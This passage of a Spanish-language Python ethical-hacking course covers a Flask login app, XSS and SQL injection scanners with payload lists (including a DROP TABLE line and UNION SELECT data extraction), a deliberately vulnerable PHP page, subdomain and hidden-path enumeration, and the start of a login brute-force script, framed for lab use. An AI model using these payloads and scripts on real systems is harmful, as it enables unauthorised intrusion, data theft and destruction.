- Cierre de sesi√≥n (logout)
- Acceso protegido a una p√°gina solo si el usuario est√° autenticado

---

### ‚öôÔ∏è Herramientas que vamos a usar

| Herramienta | Descripci√≥n                                           |
| ----------- | ----------------------------------------------------- |
| Python      | Lenguaje base                                         |
| Flask       | Micro-framework web muy ligero y f√°cil de usar        |
| SQLite      | Base de datos liviana para guardar usuarios           |
| Werkzeug    | Biblioteca para manejar contrase√±as seguras (hashing) |

---

### üõ†Ô∏è Instalaci√≥n paso a paso

#### üîπ Paso 1: Crear el entorno

```bash
mkdir flask-auth-app
cd flask-auth-app
python -m venv venv
source venv/bin/activate  # En Windows: venv\Scripts\activate
```

#### üîπ Paso 2: Instalar Flask y Werkzeug

```bash
pip install flask werkzeug
```

---

### üóÇÔ∏è Estructura del proyecto

```
flask-auth-app/
‚îÇ
‚îú‚îÄ‚îÄ app.py
‚îú‚îÄ‚îÄ templates/
‚îÇ   ‚îú‚îÄ‚îÄ index.html
‚îÇ   ‚îú‚îÄ‚îÄ login.html
‚îÇ   ‚îú‚îÄ‚îÄ register.html
‚îÇ   ‚îî‚îÄ‚îÄ protected.html
‚îî‚îÄ‚îÄ users.db  (se crea autom√°ticamente)
```

---

### üß© C√≥digo completo de la aplicaci√≥n

#### üìÑ `app.py`

```python
from flask import Flask, render_template, request, redirect, session, url_for
from werkzeug.security import generate_password_hash, check_password_hash
import sqlite3

app = Flask(__name__)
app.secret_key = 'supersecretkey'  # Cambia esto en producci√≥n

# Inicializar DB
def init_db():
    with sqlite3.connect('users.db') as conn:
        conn.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT UNIQUE NOT NULL,
                password TEXT NOT NULL
            )
        ''')
init_db()

# Ruta principal
@app.route('/')
def index():
    return render_template('index.html')

# Registro de usuarios
@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = generate_password_hash(request.form['password'])

        try:
            with sqlite3.connect('users.db') as conn:
                conn.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password))
            return redirect('/login')
        except sqlite3.IntegrityError:
            return "El usuario ya existe"

    return render_template('register.html')

# Login
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password_input = request.form['password']

        with sqlite3.connect('users.db') as conn:
            cur = conn.execute('SELECT * FROM users WHERE username = ?', (username,))
            user = cur.fetchone()

        if user and check_password_hash(user[2], password_input):
            session['user'] = username
            return redirect('/protected')
        else:
            return "Credenciales incorrectas"

    return render_template('login.html')

# P√°gina protegida
@app.route('/protected')
def protected():
    if 'user' in session:
        return render_template('protected.html', user=session['user'])
    else:
        return redirect('/login')

# Logout
@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect('/')

if __name__ == '__main__':
    app.run(debug=True)
```

---

### üßæ HTML templates

#### üìÑ `templates/index.html`

```html
<h1>Bienvenido</h1>
<a href="/register">Registrarse</a> | <a href="/login">Iniciar sesi√≥n</a>
```

---

#### üìÑ `templates/register.html`

```html
<h1>Registro</h1>
<form method="post">
  Usuario: <input type="text" name="username" /><br />
  Contrase√±a: <input type="password" name="password" /><br />
  <input type="submit" value="Registrarse" />
</form>
```

---

#### üìÑ `templates/login.html`

```html
<h1>Login</h1>
<form method="post">
  Usuario: <input type="text" name="username" /><br />
  Contrase√±a: <input type="password" name="password" /><br />
  <input type="submit" value="Iniciar sesi√≥n" />
</form>
```

---

#### üìÑ `templates/protected.html`

```html
<h1>¬°Hola {{ user }}!</h1>
<p>Has iniciado sesi√≥n correctamente.</p>
<a href="/logout">Cerrar sesi√≥n</a>
```

---

### ‚ñ∂Ô∏è C√≥mo ejecutarlo

1. Aseg√∫rate de estar en tu entorno virtual:

   ```bash
   source venv/bin/activate
   ```

2. Ejecuta el servidor:

   ```bash
   python app.py
   ```

3. Abre tu navegador en: `http://127.0.0.1:5000`

---

### ‚úÖ ¬øQu√© lograste?

- Un usuario puede registrarse y su contrase√±a se almacena en forma segura (hash).
- El usuario puede iniciar sesi√≥n y acceder a p√°ginas protegidas.
- Puedes cerrar sesi√≥n para eliminar la sesi√≥n activa.

---

[üîº](#√≠ndice)

---

## **251. Introducci√≥n al escaneo y explotaci√≥n de XSS con Python**

### üîê ¬øQu√© es XSS?

**XSS (Cross-Site Scripting)** es una vulnerabilidad com√∫n en aplicaciones web que permite a un atacante **inyectar scripts maliciosos** en p√°ginas vistas por otros usuarios.
El m√°s com√∫n es **XSS reflejado**, donde el script malicioso se ejecuta como parte de una URL manipulada.

---

### ‚ö†Ô∏è Tipos comunes de XSS

| Tipo       | Descripci√≥n                                                           |
| ---------- | --------------------------------------------------------------------- |
| Reflejado  | El script es parte de la URL.                                         |
| Almacenado | El script se guarda en la base de datos o servidor.                   |
| DOM-based  | El script se ejecuta a nivel del navegador sin pasar por el servidor. |

---

### üéØ Objetivo del ejemplo

- Simular un escaneo b√°sico de XSS.
- Enviar una **carga XSS** usando Python.
- Comprobar si es vulnerable (si se refleja la carga maliciosa).
- Instalar dependencias necesarias.

---

### ‚öôÔ∏è Requisitos

1. Python 3
2. Librer√≠as: `requests`, `BeautifulSoup` (para analizar HTML)
3. Un entorno de pr√°ctica (usaremos [DVWA](http://www.dvwa.co.uk/) o [bWAPP](http://www.itsecgames.com/)) **o un sitio controlado local**

---

### üõ†Ô∏è Instalaci√≥n

#### Paso 1: Crear el entorno

```bash
mkdir xss-scanner
cd xss-scanner
python -m venv venv
source venv/bin/activate  # En Windows: venv\Scripts\activate
```

#### Paso 2: Instalar librer√≠as

```bash
pip install requests beautifulsoup4
```

---

### üí° Ejemplo de carga XSS

```html
<script>
  alert("XSS");
</script>
```

---

### üß† ¬øQu√© vamos a hacer?

- Cargar una URL con par√°metros
- Inyectar un script (`<script>alert('XSS')</script>`)
- Leer la respuesta HTML
- Verificar si se refleja el payload en el HTML

---

### ‚úÖ C√≥digo completo de escaneo b√°sico de XSS

```python
import requests
from bs4 import BeautifulSoup
import urllib.parse

# Lista de payloads XSS comunes
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "'\"><svg/onload=alert('XSS')>",
]

# URL objetivo con un par√°metro vulnerable (ejemplo)
# Simula que el par√°metro "q" podr√≠a ser vulnerable
base_url = "http://localhost/vulnerable_app/search.php?q="

def test_xss(url, payloads):
    for payload in payloads:
        # Codificamos el payload en la URL
        target = url + urllib.parse.quote(payload)
        print(f"Probando: {target}")

        try:
            res = requests.get(target, timeout=5)
            if payload in res.text:
                print("‚ö†Ô∏è Posible vulnerabilidad XSS detectada con payload:")
                print(payload)
            else:
                print("‚úÖ No se reflej√≥ el payload.")
        except requests.RequestException as e:
            print(f"‚ùå Error al conectar: {e}")

if __name__ == "__main__":
    test_xss(base_url, payloads)
```

---

### üî¨ ¬øQu√© hace este script?

1. Toma una **URL con par√°metros** (por ejemplo, `search.php?q=algo`).
2. Inyecta varios **payloads XSS** uno por uno.
3. Env√≠a una solicitud HTTP GET.
4. Busca si el payload se **refleja** en el contenido HTML.
5. Si se refleja, **alerta que puede haber una vulnerabilidad XSS**.

---

### üß™ ¬øD√≥nde probarlo?

Puedes usar entornos como:

| Entorno              | Descripci√≥n                      |
| -------------------- | -------------------------------- |
| **DVWA**             | Damn Vulnerable Web App          |
| **bWAPP**            | Buggy Web App                    |
| **VulnHub**          | VMs vulnerables para practicar   |
| **OWASP Juice Shop** | App moderna con vulnerabilidades |

---

[üîº](#√≠ndice)

---

## **252. Escaneo y explotaci√≥n de XSS con Python**

### üß† ¬øQu√© es XSS (Cross-Site Scripting)?

**XSS** es una vulnerabilidad que permite a un atacante **inyectar c√≥digo JavaScript malicioso** en p√°ginas web visitadas por otros usuarios.

#### Tipos m√°s comunes:

| Tipo       | ¬øD√≥nde se ejecuta?                                         | Ejemplo real                  |
| ---------- | ---------------------------------------------------------- | ----------------------------- |
| Reflejado  | Se refleja en la respuesta inmediata del servidor          | `search.php?q=<script>`       |
| Almacenado | Se guarda en el servidor y se muestra a otros usuarios     | Comentarios maliciosos        |
| DOM-Based  | Se ejecuta solo en el navegador, sin pasar por el servidor | Manipulando `window.location` |

---

### üéØ ¬øQu√© vamos a construir?

Un script en Python que:

1. **Escanee autom√°ticamente** par√°metros en URLs para detectar si son vulnerables a XSS.
2. **Inyecte cargas maliciosas** (payloads) y detecte si se reflejan en la respuesta HTML.
3. **Reporte** las vulnerabilidades encontradas.

---

### üõ†Ô∏è Requisitos

#### üêç Instalaci√≥n

```bash
# 1. Crear entorno virtual (opcional)
python -m venv venv
source venv/bin/activate  # En Linux/macOS
venv\Scripts\activate     # En Windows

# 2. Instalar dependencias
pip install requests beautifulsoup4
```

---

### üìÑ Archivo objetivo de prueba (en tu entorno local)

Crea este archivo PHP simple (si tienes XAMPP, WAMP o Docker con Apache):

#### `xss-demo.php`

```php
<?php
$q = $_GET['q'] ?? '';
echo "<h1>Buscar resultado:</h1>";
echo "Has buscado: " . $q;
?>
```

Accede a `http://localhost/xss-demo.php?q=algo`.

---

### üß™ Payloads XSS comunes

```html
<script>
  alert("XSS");
</script>
<img src=x onerror=alert('XSS')> "><svg/onload=alert(1)>
```

---

### üßæ C√≥digo Python: `xss_scanner.py`

```python
import requests
from bs4 import BeautifulSoup
import urllib.parse

# Payloads XSS comunes
payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "\"><svg/onload=alert(1)>"
]

# URL vulnerable con par√°metro
base_url = "http://localhost/xss-demo.php?q="

def test_xss(url, payloads):
    for payload in payloads:
        full_url = url + urllib.parse.quote(payload)
        print(f"\nüîç Probando: {full_url}")

        try:
            response = requests.get(full_url, timeout=5)
            html = response.text

            if payload in html:
                print("üö® ¬°Vulnerabilidad XSS detectada!")
                print(f"Payload: {payload}")
            else:
                print("‚úÖ No se reflej√≥ el payload.")
        except Exception as e:
            print(f"‚ùå Error al conectar: {e}")

if __name__ == "__main__":
    test_xss(base_url, payloads)
```

---

### üöÄ ¬øC√≥mo se ejecuta?

```bash
python xss_scanner.py
```

Ver√°s algo como:

```
üîç Probando: http://localhost/xss-demo.php?q=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
üö® ¬°Vulnerabilidad XSS detectada!
Payload: <script>alert('XSS')</script>
```

---

### üõ°Ô∏è ¬øC√≥mo sabe el script si hay XSS?

‚úîÔ∏è **Env√≠a el payload como valor del par√°metro**

‚úîÔ∏è **Revisa si el mismo payload aparece en la respuesta HTML**

‚úîÔ∏è Si el c√≥digo aparece tal cual, es probable que no haya sanitizaci√≥n de entrada ‚Üí posible XSS reflejado.

---

### üß∞ Opcional: Automatizar detecci√≥n en varias URLs

Puedes guardar URLs en un `.txt` y modificar el script para leer cada una, y probar todos los par√°metros detectados autom√°ticamente con `BeautifulSoup` o `re`.

---

### ‚ö†Ô∏è √âtica y legalidad

**Este script debe usarse solo en entornos de pr√°ctica o con autorizaci√≥n. Nunca escanees sitios reales sin permiso.**

---

### üì¶ Entornos seguros de pr√°ctica recomendados

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [Hack The Box](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

### üìå Resumen

| Elemento        | Descripci√≥n                                    |
| --------------- | ---------------------------------------------- |
| Herramienta     | Python script con `requests` y `bs4`           |
| Vulnerabilidad  | XSS reflejado                                  |
| Tipo de escaneo | Autom√°tico, con payloads                       |
| Entorno seguro  | PHP local o apps como DVWA                     |
| Objetivo        | Encontrar par√°metros vulnerables y explotarlos |

---

[üîº](#√≠ndice)

---

## **253. Implementa un esc√°ner de SQL Injection con Python**

### üß† ¬øQu√© es SQL Injection (SQLi)?

Es una vulnerabilidad que permite a un atacante **inyectar c√≥digo SQL malicioso** en campos de entrada (como formularios o par√°metros en URLs) para manipular una base de datos.

#### Ejemplo:

```url
http://localhost/product?id=1
```

Si alguien escribe esto:

```url
http://localhost/product?id=1' OR '1'='1
```

El backend podr√≠a ejecutar:

```sql
SELECT * FROM productos WHERE id='1' OR '1'='1'
```

Y devolver **todos los productos** ‚Äî ¬°un gran problema de seguridad!

---

### üéØ ¬øQu√© vamos a hacer?

Crear un script que:

1. Toma una URL con par√°metros.
2. Inyecta _payloads_ SQL t√≠picos.
3. Detecta si hay errores de base de datos en la respuesta.

---

### üõ†Ô∏è Requisitos

#### üîß Instalaci√≥n

```bash
# 1. Crear entorno virtual (opcional)
python -m venv venv
source venv/bin/activate  # En Linux/macOS
venv\Scripts\activate     # En Windows

# 2. Instalar dependencias
pip install requests
```

---

### üì¶ Aplicaci√≥n vulnerable para pruebas (DVWA)

Instala DVWA (Damn Vulnerable Web Application):

- Sitio: [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA)
- Requiere Apache + PHP + MySQL (XAMPP, WAMP, o Docker)

Accede a: `http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit`

---

### üíâ Payloads comunes de SQLi

```python
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "\" OR \"1\"=\"1",
    "' OR sleep(5)--"
]
```

---

### üßæ Script completo: `sqli_scanner.py`

```python
import requests
import urllib.parse

# Payloads t√≠picos para probar SQL Injection
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR sleep(5)--",
    "\" OR \"1\"=\"1",
    "' AND 1=2 UNION SELECT NULL, version()--"
]

# Funci√≥n que prueba SQLi en una URL
def test_sql_injection(url):
    vulnerable = False
    print(f"üîç Escaneando: {url}")

    for payload in payloads:
        # Separar base y par√°metros
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # Inyectar el payload en cada par√°metro
        for param in params:
            original = params[param][0]
            params[param][0] = original + payload

            # Reconstruir la URL con el payload
            new_query = urllib.parse.urlencode(params, doseq=True)
            new_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            print(f"‚û°Ô∏è Probando: {new_url}")
            try:
                res = requests.get(new_url)
                if "You have an error in your SQL syntax" in res.text or "sql" in res.text.lower():
                    print(f"üö® ¬°Vulnerabilidad detectada con payload: {payload}")
                    vulnerable = True
            except Exception as e:
                print(f"‚ùå Error: {e}")
            finally:
                # Restaurar el valor original del par√°metro
                params[param][0] = original

    if not vulnerable:
        print("‚úÖ No se detectaron vulnerabilidades SQLi.")

# URL de prueba
if __name__ == "__main__":
    url = "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"
    test_sql_injection(url)
```

---

### üìå ¬øC√≥mo se usa?

1. Aseg√∫rate de que DVWA est√© corriendo.
2. Configura el nivel de seguridad en "Low".
3. Ejecuta el script:

```bash
python sqli_scanner.py
```

Ver√°s salidas como:

```
‚û°Ô∏è Probando: http://localhost/dvwa/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit
üö® ¬°Vulnerabilidad detectada con payload: ' OR '1'='1
```

---

### üõ°Ô∏è ¬øC√≥mo detecta si hay una vulnerabilidad?

‚úÖ Busca **mensajes de error** en la respuesta HTML como:

- `"You have an error in your SQL syntax"`
- `"Warning: mysql_"`

üìå Tambi√©n puedes hacer que mida el tiempo de respuesta para detectar ataques de _time-based blind SQLi_.

---

### ‚ö†Ô∏è √âtica y legalidad

**Este tipo de herramientas deben usarse solo en entornos de prueba** o con **permiso expl√≠cito** del due√±o del sitio web.

---

### üß™ ¬øD√≥nde practicar legalmente?

- [DVWA](https://github.com/digininja/DVWA)
- [bWAPP](http://www.itsecgames.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [TryHackMe](https://tryhackme.com/)
- [HackTheBox](https://www.hackthebox.com/)

---

[üîº](#√≠ndice)

---

## **254. Escaneo y explotaci√≥n de SQL Injection con Python**

### üß† ¬øQu√© es SQL Injection (SQLi)?

SQL Injection es una vulnerabilidad que ocurre cuando una aplicaci√≥n web permite que un usuario inyecte c√≥digo SQL directamente en las consultas a la base de datos, sin validarlo. Esto permite desde leer datos hasta borrar tablas completas si no se filtra correctamente.

---

### üéØ Objetivo

- **Escanear una URL o formulario vulnerable.**
- **Inyectar c√≥digo SQL malicioso.**
- **Extraer datos de la base de datos si es vulnerable.**

---

### üõ†Ô∏è ¬øQu√© vamos a usar?

#### 1. Python

#### 2. M√≥dulos:

- `requests` para enviar peticiones HTTP.
- `urllib.parse` para manipular URLs.
- `re` para expresiones regulares.
- `colorama` (opcional) para imprimir con colores.

#### 3. Aplicaci√≥n vulnerable: **DVWA** (Damn Vulnerable Web Application)

---

### üì¶ Instalaci√≥n de DVWA (opcional pero recomendable para pruebas)

#### üî¥ Opci√≥n 1: Usar XAMPP (Windows/Linux/macOS)

1. Instala [XAMPP](https://www.apachefriends.org/index.html)
2. Clona el repositorio de DVWA en la carpeta `htdocs`:

```bash
git clone https://github.com/digininja/DVWA.git
```

3. Inicia Apache y MySQL desde el panel de XAMPP.

4. Accede en tu navegador a:
   `http://localhost/DVWA/setup.php`

5. Haz clic en ‚ÄúCreate/Reset Database‚Äù.

6. En la configuraci√≥n de DVWA (`config/config.inc.php`) pon:

```php
$_DVWA[ 'security_level' ] = 'low';
```

---

### üêç Instalar dependencias de Python

```bash
pip install requests colorama
```

---

### üîç Fase 1: Escaneo SQL Injection

Vamos a enviar **payloads comunes de inyecci√≥n** a una URL y detectar si hay errores en la respuesta.

#### üß™ Payloads comunes:

```python
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' OR sleep(3)--",
    "\" OR \"1\"=\"1"
]
```

---

### üßæ C√≥digo completo: `sql_injector.py`

```python
import requests
import urllib.parse
import re
from colorama import Fore, Style

# Payloads SQL t√≠picos
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
    "' OR sleep(3)--",
    "' AND 1=2 UNION SELECT NULL, version()--"
]

# Palabras clave que indican error SQL
sql_errors = [
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "Unclosed quotation mark",
    "quoted string not properly terminated",
    "SQLSTATE"
]

def scan_sql_injection(url):
    print(Fore.YELLOW + f"üîç Analizando URL: {url}" + Style.RESET_ALL)
    vulnerable = False

    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)

    for param in params:
        for payload in payloads:
            test_params = params.copy()
            test_params[param] = [params[param][0] + payload]
            new_query = urllib.parse.urlencode(test_params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

            try:
                res = requests.get(test_url, timeout=5)
                for error in sql_errors:
                    if error.lower() in res.text.lower():
                        print(Fore.RED + f"üö® Vulnerable con payload: {payload}" + Style.RESET_ALL)
                        print(f"‚û°Ô∏è {test_url}")
                        vulnerable = True
                        break
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"‚ùå Error al probar: {test_url}\n{e}" + Style.RESET_ALL)

    if not vulnerable:
        print(Fore.GREEN + "‚úÖ No se detect√≥ inyecci√≥n SQL con los payloads usados." + Style.RESET_ALL)

# üëâ Inserta aqu√≠ la URL vulnerable
if __name__ == "__main__":
    url = "http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
    scan_sql_injection(url)
```

---

### üèÅ ¬øC√≥mo ejecutar?

```bash
python sql_injector.py
```

üîé Ver√°s si alguno de los payloads provoca un error de SQL, lo cual **confirma una vulnerabilidad**.

---

### üí£ Fase 2: Explotaci√≥n de la vulnerabilidad (con `UNION SELECT`)

Una vez descubierta una vulnerabilidad, puedes intentar extraer informaci√≥n como:

- Versi√≥n de la base de datos: `version()`
- Usuario actual: `user()`
- Base de datos actual: `database()`

#### üî• Ejemplo de payload con extracci√≥n:

```sql
?id=1' UNION SELECT NULL, version()--
```

---

### üß† ¬øC√≥mo automatizar eso en el script?

Puedes modificar el payload para buscar informaci√≥n:

```python
' AND 1=2 UNION SELECT NULL, user()--
' AND 1=2 UNION SELECT NULL, database()--
```

Y ver si en la respuesta aparece algo como:

```
root@localhost
```

---

### üõ°Ô∏è Recomendaciones

- Usa esto **solo en entornos de pruebas** o con **permiso legal**.
- Este script puede evolucionar en una herramienta completa que:

  - Use diccionarios de payloads.
  - Pruebe SQLi booleano y ciego.
  - Automatice fuzzing con hilos.
  - Exporta resultados a CSV o HTML.

---

### üß™ Plataformas donde practicar

| Plataforma                                                             | Tipo de pr√°ctica         |
| ---------------------------------------------------------------------- | ------------------------ |
| [DVWA](https://github.com/digininja/DVWA)                              | Local, vulnerable        |
| [bWAPP](http://www.itsecgames.com/)                                    | Local, vulnerable        |
| [HackTheBox](https://www.hackthebox.com/)                              | CTF real, legal          |
| [TryHackMe](https://tryhackme.com/)                                    | Gu√≠as paso a paso        |
| [PortSwigger Labs](https://portswigger.net/web-security/sql-injection) | Laboratorios controlados |

---

[üîº](#√≠ndice)

---

## **255. Descubrimiento de subdominios con Python**

![subdominios](../img/4_Python_Hacking_Ciberseguridad_y_Hacking_Etico_con_Python/subdominios.webp "subdominios")

### üìò ¬øQu√© es el descubrimiento de subdominios?

Los **subdominios** son partes de un dominio principal, por ejemplo:

- `mail.ejemplo.com`
- `blog.ejemplo.com`
- `dev.ejemplo.com`

Descubrir subdominios permite **identificar posibles puertas de entrada** o servicios mal configurados. Esta t√©cnica es com√∫n en **pentesting**, **reconocimiento** y **bug bounty**.

---

### üéØ ¬øQu√© aprender√°s aqu√≠?

- Qu√© es y c√≥mo funciona el descubrimiento de subdominios.
- C√≥mo instalar las herramientas necesarias.
- C√≥mo hacer un script en Python para escanear subdominios.
- C√≥mo usar una **wordlist** para buscar subdominios.

---

### üß∞ Requisitos

#### ‚úÖ Necesitas tener:

- Python 3 instalado
- Acceso a internet
- Un archivo con posibles subdominios (una wordlist)
- Un dominio para probar (por ejemplo: `example.com` o uno propio)

---

### üõ†Ô∏è Instalaci√≥n

#### 1. Crea un entorno de trabajo:

```bash
mkdir subdomain_scanner
cd subdomain_scanner
```

#### 2. Crea y activa un entorno virtual (opcional pero recomendado):

```bash
python -m venv env
source env/bin/activate  # En Linux/macOS
env\Scripts\activate     # En Windows
```

#### 3. Instala dependencias necesarias:

```bash
pip install requests
```

---

### üìú Crea un archivo de wordlist (subdominios.txt)

Este archivo tendr√° subdominios comunes. Ejemplo:

```txt
www
mail
ftp
blog
dev
test
admin
portal
vpn
```

Gu√°rdalo como `subdominios.txt` en tu carpeta.

---

### üßæ Script completo en Python

Guarda este c√≥digo como `subdomain_finder.py`:

```python
import requests

def buscar_subdominios(dominio, archivo_wordlist):
    print(f"üîç Buscando subdominios para: {dominio}\n")

    with open(archivo_wordlist, "r") as file:
        subdominios = file.read().splitlines()

    encontrados = []

    for sub in subdominios:
        url = f"http://{sub}.{dominio}"
        try:
            response = requests.get(url, timeout=2)
            print(f"‚úÖ Encontrado: {url} (Status: {response.status_code})")
            encontrados.append(url)
        except requests.ConnectionError:
            pass  # No mostrar si no existe
        except Exception as e:
            print(f"‚ö†Ô∏è Error con {url}: {e}")

    if not encontrados:
        print("‚ùå No se encontraron subdominios disponibles.")
    else:
        print("\n‚úÖ Subdominios encontrados:")
        for sub in encontrados:
            print(" -", sub)

# üëá Personaliza aqu√≠ tu dominio
if __name__ == "__main__":
    dominio = "example.com"  # Cambia esto por tu dominio real
    wordlist = "subdominios.txt"
    buscar_subdominios(dominio, wordlist)
```

---

### ‚ñ∂Ô∏è ¬øC√≥mo ejecutarlo?

```bash
python subdomain_finder.py
```

üîç Ver√°s una salida como esta (si el dominio tiene esos subdominios disponibles):

```
‚úÖ Encontrado: http://www.example.com (Status: 200)
‚úÖ Encontrado: http://blog.example.com (Status: 200)

‚úÖ Subdominios encontrados:
 - http://www.example.com
 - http://blog.example.com
```

---

### üß† ¬øQu√© est√° haciendo el script?

1. Lee posibles subdominios desde un archivo.
2. Forma URLs como `http://subdominio.dominio.com`.
3. Intenta hacer una solicitud HTTP.
4. Si el servidor responde, el subdominio **existe y est√° en l√≠nea**.

---

### üí° Mejores wordlists p√∫blicas

Puedes usar una lista m√°s grande como las de [SecLists](https://github.com/danielmiessler/SecLists):

```bash
git clone https://github.com/danielmiessler/SecLists.git
```

Y usar por ejemplo:

```
SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

---

### ‚ö†Ô∏è Advertencias √©ticas

- **No ataques dominios sin permiso.** Solo haz esto en tu propio dominio o entornos de prueba.
- Este script es solo para fines educativos o pruebas de seguridad autorizadas.

---

[üîº](#√≠ndice)

---

## **256. Descubrimiento de contenido web con Python**

### üìò ¬øQu√© es el descubrimiento de contenido web?

El **descubrimiento de contenido web** es una t√©cnica de **reconocimiento pasivo/activo** usada para **detectar archivos o directorios ocultos** en un sitio web.
Esto se hace probando rutas comunes como:

- `/admin`
- `/login`
- `/uploads`
- `/config.php`
- `/backup/`

Esto puede revelar **vulnerabilidades o informaci√≥n sensible**, especialmente si el sitio deja expuestos recursos sin protecci√≥n.

---

### üß† ¬øPara qu√© sirve?

- Verificar archivos olvidados en producci√≥n
- Encontrar paneles de administraci√≥n
- Enumerar endpoints para pentesting
- Auditar configuraciones de un sitio

---

### üß∞ Requisitos previos

Necesitar√°s:

- Python 3 instalado
- Conexi√≥n a internet
- Un archivo `.txt` con rutas/directorios comunes
- El sitio objetivo (¬°usa un entorno de prueba o autorizado!)

---

### üõ†Ô∏è Instalaci√≥n paso a paso

#### 1. Crear un entorno de trabajo

```bash
mkdir contenido_web_scanner
cd contenido_web_scanner
```

#### 2. Crear un entorno virtual (opcional)

```bash
python -m venv env
source env/bin/activate    # Linux/macOS
env\Scripts\activate       # Windows
```

#### 3. Instalar dependencia necesaria

```bash
pip install requests
```

---

### üìú Crear archivo de diccionario (wordlist)

Crea un archivo `rutas.txt` con rutas comunes:

```txt
admin
login
config
backup
uploads
dashboard
api
robots.txt
.git
.env
```

---

### üíª Script completo en Python

Guarda esto como `descubrimiento_contenido.py`:

```python
import requests

def escanear_contenido(base_url, wordlist):
    print(f"üîç Escaneando rutas en: {base_url}\n")

    with open(wordlist, "r") as f:
        rutas = f.read().splitlines()

    encontradas = []

    for ruta in rutas:
        url = f"{base_url.rstrip('/')}/{ruta}"
        try:
            respuesta = requests.get(url, timeout=3)
            if respuesta.status_code not in [404, 403]:
                print(f"‚úÖ Encontrado: {url} (Status: {respuesta.status_code})")
                encontradas.append(url)
        except requests.RequestException as e:
            print(f"‚ö†Ô∏è Error al conectar con {url}: {e}")

    if not encontradas:
        print("‚ùå No se encontr√≥ contenido accesible.")
    else:
        print("\nüìÑ Rutas encontradas:")
        for u in encontradas:
            print(" -", u)

# üëá Cambia esto por el dominio real a escanear
if __name__ == "__main__":
    url_objetivo = "http://testphp.vulnweb.com"  # Sitio de prueba
    archivo_rutas = "rutas.txt"
    escanear_contenido(url_objetivo, archivo_rutas)
```

---

### ‚ñ∂Ô∏è ¬øC√≥mo ejecutarlo?

```bash
python descubrimiento_contenido.py
```

Ver√°s una salida similar a:

```
üîç Escaneando rutas en: http://testphp.vulnweb.com

‚úÖ Encontrado: http://testphp.vulnweb.com/admin (Status: 200)
‚úÖ Encontrado: http://testphp.vulnweb.com/login (Status: 200)

üìÑ Rutas encontradas:
 - http://testphp.vulnweb.com/admin
 - http://testphp.vulnweb.com/login
```

---

### üí° ¬øC√≥mo funciona este script?

1. Toma una URL base (`http://testphp.vulnweb.com`).
2. Lee rutas desde un archivo (como `admin`, `login`, `config`).
3. Intenta hacer una solicitud HTTP a cada ruta.
4. Si no recibe un `404`, lo marca como **posible ruta v√°lida**.

---

### üß† Mejora del script (ideas):

- Agregar soporte a HTTPS
- Usar multihilos para acelerar (con `concurrent.futures`)
- Exportar resultados a `.txt` o `.csv`
- Integrar con `streamlit` para interfaz web
- Agregar detecci√≥n de archivos PHP/JS/etc.

---

### ‚ö†Ô∏è Importante

> üõ°Ô∏è **Este script es solo para fines educativos o pruebas en entornos propios/autorizados.**
>
> Nunca lo uses sin permiso en sitios reales.

---

### ‚úÖ Conclusi√≥n

Has aprendido a:

- Instalar Python y requests
- Crear una wordlist de rutas
- Detectar rutas ocultas en sitios web
- Automatizarlo con un script en Python

---

[üîº](#√≠ndice)

---

## **257. Fuerza Bruta a paneles de autenticaci√≥n web con Python**

### üß† ¬øQu√© es un ataque de fuerza bruta?

Un **ataque de fuerza bruta** consiste en **probar muchas combinaciones** de nombre de usuario y contrase√±a **hasta encontrar la correcta**.

üëâ En el caso de aplicaciones web, esto implica enviar repetidas peticiones HTTP al formulario de login hasta obtener acceso.

---

### ‚ö†Ô∏è Importante

> ‚úÖ **Este contenido es exclusivamente educativo.**
>
> ‚ùå **Nunca lo uses en sistemas que no te pertenecen o sin autorizaci√≥n.**

Para pruebas legales puedes usar entornos como:

- [`http://testphp.vulnweb.com`](http://testphp.vulnweb.com)
- Aplicaciones locales como [DVWA](https://github.com/digininja/DVWA) (Damn Vulnerable Web App)

---

### üìã Requisitos

- Python 3
- Librer√≠a `requests`
- Wordlists de usuarios/contrase√±as

---

### üß∞ Instalaci√≥n

```bash
mkdir fuerza_bruta_login
cd fuerza_bruta_login
python -m venv env
source env/bin/activate       # En Linux/macOS
env\Scripts\activate          # En Windows

pip install requests
```

---

### üìÅ Archivos necesarios

#### 1. `usuarios.txt`

```txt
admin
user
test
juan
```

#### 2. `passwords.txt`

```txt
123456
admin123
password
qwerty
test123
```

---

### üìú Script completo: `fuerza_bruta_login.py`

```python
import requests

def fuerza_bruta_login(url_login, archivo_usuarios, archivo_passwords):
    with open(archivo_usuarios, 'r') as usuarios:
        usuarios = [u.strip() for u in usuarios.readlines()]

    with open(archivo_passwords, 'r') as passwords:
